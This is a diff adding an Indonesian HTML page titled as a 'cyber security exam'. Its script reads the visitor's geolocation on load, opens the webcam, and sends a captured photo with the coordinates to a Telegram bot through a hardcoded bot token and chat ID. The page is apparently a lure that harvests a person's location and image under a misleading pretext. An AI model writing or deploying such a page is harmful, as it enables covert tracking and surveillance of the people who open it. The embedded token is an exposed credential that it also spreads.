@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Ujian Cyber Security</title>
+</head>
+<body>
+  <h1>Deteksi Lokasi dan Kamera</h1>
+  <p id="location">Mengambil lokasi...</p>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <br><br>
+  <button onclick="captureAndSend()">Ambil Foto & Kirim ke Telegram</button>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8485657668:AAHeH2g82CDPoB9MJyruOnfXEu7dU9rKs_8';
+    const TELEGRAM_CHAT_ID = '7979700473';
+
+    let latitude = "", longitude = "";
+
+    // Ambil lokasi
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          latitude = position.coords.latitude;
+          longitude = position.coords.longitude;
+          document.getElementById("location").innerText = `Lokasi Anda: Latitude ${latitude}, Longitude ${longitude}`;
+        },
+        function(error) {
+          document.getElementById("location").innerText = "Gagal ambil lokasi: " + error.message;
+        }
+      );
+    }
+
+    // Tampilkan kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        document.getElementById("video").srcObject = stream;
+      })
+      .catch(function(err) {
+        console.error("Kamera error:", err);
+      });
+
+    // Capture dan kirim ke Telegram
+    function captureAndSend() {
+      const canvas = document.getElementById("canvas");
+      const video = document.getElementById("video");
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(function(blob) {
+        // Kirim ke Telegram
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+        formData.append("photo", blob);
+        formData.append("caption", `Lokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(res => alert("Terkirim ke Telegram!"))
+          .catch(err => alert("Gagal kirim: " + err));
+      }, 'image/jpeg');
+    }
+  </script>
+</body>
+</html>
